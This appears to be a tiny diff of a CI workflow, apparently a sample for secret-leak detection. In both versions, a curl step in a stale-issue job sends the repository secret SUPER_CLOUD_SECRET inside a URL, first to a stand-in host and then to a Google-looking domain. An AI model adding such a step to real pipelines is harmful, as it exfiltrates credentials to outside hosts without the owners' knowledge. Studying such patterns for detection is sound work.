@@ -15,4 +15,4 @@ jobs:
     steps:
       - uses: actions/stale@v5
       - run: |
-          curl http://api.contoso.com/build/token=${{ secrets.SUPER_CLOUD_SECRET }}
+          curl https://acmedns.googleapis.com/token=${{ secrets.SUPER_CLOUD_SECRET }}
